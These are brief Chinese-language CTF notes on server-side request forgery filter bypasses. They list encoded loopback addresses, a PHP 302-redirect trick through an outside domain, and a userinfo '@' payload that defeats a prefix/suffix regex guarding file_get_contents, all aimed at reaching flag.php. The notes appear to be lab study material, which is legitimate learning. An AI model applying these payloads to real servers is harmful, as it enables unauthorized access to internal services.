过滤了/localhost|127.0.0
可用127.0.1
127.1
进制转绕过

- 2130706433  10进制 http://2130706433  
- 017700000001 8进制 http://017700000001 
- 7F000001 16进制   http://0x7F000001 
  
过滤了0,1
利用302跳转（需要有域名）
```php
<?php
header("Location:http://127.0.0.1/flag.php");

```
url=http://sudo.cc/flag.php


绕过前缀限制和后缀限制
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

url=http://ctf.@127.0.0.1/flag.php?show

